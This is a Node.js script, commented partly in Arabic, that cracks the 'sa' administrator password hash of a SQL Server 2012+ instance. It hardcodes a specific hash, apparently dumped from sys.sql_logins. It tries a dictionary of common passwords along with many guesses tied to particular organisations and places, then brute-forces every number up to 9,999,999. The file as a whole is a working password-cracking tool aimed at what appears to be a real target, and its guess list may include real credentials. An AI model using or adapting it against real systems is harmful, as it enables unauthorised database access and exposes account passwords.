/**
 * كسر هاش كلمة سر sa من SQL Server 2012+
 * Format: 0x0200 + salt(4B) + SHA512(salt + password_UTF16LE)
 */
import crypto from 'node:crypto';

// sa password hash from sys.sql_logins
const fullHash = '0200F677182CA77A721E73FAD939EF199BA56FF15D3FF0235DEDE81EB8C980F50A9FDC48D1C1F58281D0DF59FC4F692D4049F0F5C178EC0D60D224DAC59E192BDDA960CA8027';

const salt = Buffer.from(fullHash.substring(4, 12), 'hex'); // F677182C
const targetHash = fullHash.substring(12); // the SHA-512 hash

console.log('Salt:', salt.toString('hex'));
console.log('Target SHA-512:', targetHash);

function testPassword(pwd) {
  const pwdBuf = Buffer.from(pwd, 'utf16le');
  const data = Buffer.concat([salt, pwdBuf]);
  const hash = crypto.createHash('sha512').update(data).digest('hex');
  return hash === targetHash;
}

// Dictionary
const dict = [
  'admin','Admin','ADMIN','administrator','Administrator','ADMINISTRATOR',
  '123','1234','12345','123456','1234567','12345678','123456789',
  '11225511','password','Password','P@ssw0rd','P@ssword1',
  'sa','SA','Sa','system','System','SYSTEM',
  'ecas','ECAS','Ecas','Ecas@123','ECAS@123','ecas@123',
  '2014','admin2014','Admin2014','Ecas2014','ECAS2014','Ecas@2014',
  'Asd@123','zuc2673','zuc2668','Ecas@9982.zuc','LitN3wYnet_123',
  'mypassword4lonin','zuakha033','nullandnotempty',
  'Admin@206','ATWAAlregam@123321','Ymax@123','YemenID@555',
  'AlhamRead@2026!','almham2026','Almham@2026',
  'abc123','qwerty','letmein','master','dragon','root',
  'Kamaran24','Alnajmpower11','LitYidSMS@123',
  'test','Test','TEST','guest','Guest','user','User',
  'pass','Pass','PASS','pass123','Pass123','Pass@123',
  'Welcome1','Welcome@1','Changeme1','Change@1',
  'Sql2014','SQL2014','sql2014','SqlServer2014',
  'Passw0rd','passw0rd','PASSW0RD',
  'Power@2014','Station@2014','Yemen2014','yemen2014',
  'sa123','Sa123','SA123','sa@123','Sa@123','SA@123',
  'sa1234','sa12345','sa123456',
];

console.log(`\n🔑 Testing ${dict.length} dictionary words...`);
for (const pwd of dict) {
  if (testPassword(pwd)) {
    console.log(`\n🚨🚨🚨 FOUND: sa password = "${pwd}"`);
    process.exit(0);
  }
}
console.log('Dictionary: no match');

// Brute force numbers 0-9999999
console.log('\n🔢 Brute force 0-9999999...');
for (let n = 0; n <= 9999999; n++) {
  if (testPassword(String(n))) {
    console.log(`\n🚨🚨🚨 FOUND: sa password = "${n}"`);
    process.exit(0);
  }
  if (n % 1000000 === 0 && n > 0) process.stdout.write(`  ${n/1000000}M `);
}

console.log('\n❌ Not found');
process.exit(1);
